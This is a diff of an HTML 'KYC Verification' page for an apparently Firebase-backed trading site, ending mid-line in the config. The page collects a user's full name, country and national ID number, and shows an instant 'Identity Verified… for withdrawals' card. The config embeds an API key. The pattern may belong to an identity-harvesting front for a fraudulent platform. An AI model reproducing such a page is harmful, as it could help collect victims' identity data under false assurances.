@@ -2,17 +2,39 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KYC - Verification</title>
+    <title>KYC Verification</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; text-align: center; }
+        input, select { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; }
+        .btn { width: 90%; padding: 15px; background: #1e3a8a; color: white; border: none; border-radius: 10px; font-weight: bold; }
+        .verified-card { display: none; background: #f0fdf4; padding: 40px; border-radius: 20px; border: 2px solid #22c55e; }
+    </style>
 </head>
-<body style="font-family: sans-serif; padding: 20px; background: #f4f4f4;">
-    <div style="background: white; padding: 20px; border-radius: 10px;">
-        <h3>KYC Verification</h3>
-        <p>Please upload your ID card details to enable withdrawals.</p>
-        <label>Full Name:</label><br><input type="text" style="width:100%; padding:10px; margin:10px 0;"><br>
-        <label>ID Card Number:</label><br><input type="number" style="width:100%; padding:10px; margin:10px 0;"><br>
-        <label>Upload ID Front (Screenshot):</label><br><input type="file" style="margin:10px 0;"><br>
-        <button onclick="alert('Submitted for review!')" style="width:100%; padding:15px; background:green; color:white; border:none; border-radius:8px;">Submit KYC</button>
+<body>
+    <div id="kycForm">
+        <h2>Submit KYC</h2>
+        <input type="text" id="fullName" placeholder="Full Name">
+        <select id="country">
+            <option value="PK">Pakistan 🇵🇰</option>
+            <option value="IN">India 🇮🇳</option>
+            <option value="GB">United Kingdom 🇬🇧</option>
+            <option value="US">USA 🇺🇸</option>
+        </select>
+        <input type="text" id="idNum" placeholder="CNIC / ID Number">
+        <button class="btn" onclick="submitKYC()">Submit Details</button>
     </div>
-</body>
-</html>
 
+    <div id="verifiedBox" class="verified-card">
+        <h1 id="flagDisp" style="font-size:80px;">🇵🇰</h1>
+        <h2 style="color:#16a34a;">Identity Verified</h2>
+        <p>Your account is 100% verified for withdrawals.</p>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCh-1xi3jkIj5hUsmbm3GFGfT_AlWmxYkk",
+            authDomain: "maker-trading-official.firebase
+        
